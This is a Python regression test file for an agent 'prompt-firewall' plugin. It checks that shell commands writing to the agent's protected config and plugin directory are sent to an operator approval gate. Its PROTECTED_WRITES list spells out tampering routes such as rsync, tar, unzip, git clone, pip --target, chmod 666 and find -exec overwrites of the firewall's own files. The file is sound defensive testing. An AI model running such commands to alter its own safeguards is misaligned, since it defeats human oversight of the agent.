"""Regression: protected writes through shell/exec commands (F1).

The 1.1.6 resolver knew a fixed set of write verbs. A protected write made
through a verb outside that set - ``rsync``, ``tar``, ``unzip``, ``git``,
``pip``, ``xargs``, ``find -exec`` - was silently allowed.

These tests pin both halves of the correction:

* every protected write that names a protected surface is escalated to the
  operator's gate (``approve``), never allowed silently;
* every legitimate read-only operation, and every protected path used as a
  *source*, stays allowed.

The commands are only ever passed to the policy as strings. Nothing is
executed.
"""
import importlib.util
import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location(
    "pf_f1_tests", ROOT / "__init__.py", submodule_search_locations=[str(ROOT)]
)
assert spec and spec.loader
pf = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = pf
spec.loader.exec_module(pf)

import importlib  # noqa: E402

policy = importlib.import_module(f"{spec.name}.policy")


def _home() -> str:
    return str(policy.normalize_path(str(Path.home() / ".hermes")))


H = _home()

#: (label, command) pairs that must never pass silently.
PROTECTED_WRITES = [
    ("rsync to protected config", f"rsync -a /tmp/evil.yaml {H}/config.yaml"),
    ("rsync to protected config (slash)", f"rsync -a /tmp/evil.yaml {H}/config.yaml/"),
    ("rsync dir to protected plugins", f"rsync -a /tmp/dir/ {H}/plugins/prompt-firewall/"),
    ("tar extract to protected plugins", f"tar xzf /tmp/evil.tgz -C {H}/plugins/prompt-firewall"),
    ("tar extract (long flags)", f"tar --extract --gzip --file /tmp/evil.tar --directory {H}"),
    ("tar extract (dash flags)", f"tar -xzf /tmp/evil.tar -C {H}"),
    ("unzip to protected plugins", f"unzip -o /tmp/evil.zip -d {H}/plugins/prompt-firewall"),
    ("git clone into protected plugins", f"git clone https://example.invalid/x {H}/plugins/prompt-firewall/evil"),
    ("git worktree into protected plugins", f"git worktree add {H}/plugins/prompt-firewall/wt branch"),
    ("pip install --target protected", f"pip install --target {H}/plugins/prompt-firewall/pkg pkg"),
    ("npm install --prefix protected", f"npm install --prefix {H}/plugins/prompt-firewall pkg"),
    ("sh -c rsync", f"sh -c 'rsync -a /tmp/x {H}/config.yaml'"),
    ("bash -c tar", f'bash -c "tar xzf /tmp/e.tgz -C {H}/plugins"'),
    ("piped tar extract", f"cat /tmp/e.tgz | tar -x -C {H}"),
    ("xargs wrapped copy", f"xargs -I@ cp @ {H}/config.yaml < /tmp/list"),
    ("find -exec copy", f"find /tmp -name '*.py' -exec cp {{}} {H}/config.yaml ;"),
    ("scp to protected config", f"scp /tmp/evil.yaml {H}/config.yaml"),
    ("mkdir inside protected plugins", f"mkdir -p {H}/plugins/prompt-firewall/evil"),
    ("chmod of protected config", f"chmod 666 {H}/config.yaml"),
    ("sponge into protected config", f"sponge {H}/config.yaml < /tmp/evil"),
]

#: (label, command) pairs that must stay allowed.
BENIGN = [
    ("cat protected file", f"cat {H}/config.yaml"),
    ("ls protected dir", f"ls -la {H}/plugins/prompt-firewall"),
    ("grep protected file", f"grep -r pattern {H}/config.yaml"),
    ("protected path as cp source", f"cp {H}/config.yaml /tmp/copy.yaml"),
    ("protected path as rsync source", f"rsync -a {H}/config.yaml /tmp/"),
    ("protected path as tar source", f"tar czf /tmp/backup.tgz {H}/config.yaml"),
    ("cat protected into benign file", f"cat {H}/config.yaml > /tmp/copy.yaml"),
    ("tar list archive", "tar -tzf /tmp/backup.tgz"),
    ("tar list archive (long flag)", "tar --list --gzip --file /tmp/backup.tgz"),
    ("unzip list archive", "unzip -l /tmp/backup.zip"),
    ("git status", "git status"),
    ("git log", "git log --oneline -5"),
    ("find without exec", "find /tmp -name '*.py'"),
    ("sed without -i", f"sed -n '1,5p' {H}/config.yaml"),
    ("pip download", "pip download pkg -d /tmp/dl"),
    ("pip list", "pip list"),
    ("npm view", "npm view lodash version"),
    ("benign write", "echo hello > /tmp/out.txt"),
    ("benign mkdir", "mkdir -p /tmp/work/sub"),
    ("benign tee", "cat /tmp/in.txt | tee /tmp/out.txt"),
    ("benign chmod", "chmod 644 /tmp/file.txt"),
    ("git clone to benign path", "git clone https://example.invalid/x /tmp/clone"),
    ("rsync to benign path", "rsync -a /tmp/src/ /tmp/dst/"),
    ("unzip to benign dir", "unzip -o /tmp/a.zip -d /tmp/out"),
    ("tar create to benign file", "tar czf /tmp/out.tgz /tmp/src"),
]


def _verdict(command: str):
    return policy.evaluate_tool_call("terminal", {"command": command})


def test_protected_writes_are_escalated():
    for label, command in PROTECTED_WRITES:
        verdict = _verdict(command)
        assert verdict.action != "allow", (
            f"{label}: protected write was allowed silently "
            f"({verdict.action}/{verdict.reason})"
        )
        assert verdict.action == "approve", (
            f"{label}: expected an approval gate, got {verdict.action}"
        )


def test_benign_and_read_only_operations_stay_allowed():
    for label, command in BENIGN:
        verdict = _verdict(command)
        assert verdict.action == "allow", (
            f"{label}: legitimate operation was escalated "
            f"({verdict.action}/{verdict.reason})"
        )


def test_registered_hook_escalates_protected_write():
    hook = pf._on_pre_tool_call(
        tool_name="terminal",
        args={"command": f"rsync -a /tmp/evil.yaml {H}/config.yaml"},
        session_key="test",
    )
    assert hook is not None
    assert hook.get("action") == "approve"


def test_registered_hook_allows_read_only():
    hook = pf._on_pre_tool_call(
        tool_name="terminal",
        args={"command": f"cat {H}/config.yaml"},
        session_key="test",
    )
    assert hook is None or hook.get("action") != "approve"


def test_hook_manifest_unchanged():
    assert set(pf.HOOKS) == {
        "transform_tool_result",
        "pre_tool_call",
        "pre_llm_call",
    }
    assert tuple(pf.REQUIRED_HOOKS) == (
        "transform_tool_result",
        "pre_tool_call",
        "pre_llm_call",
    )
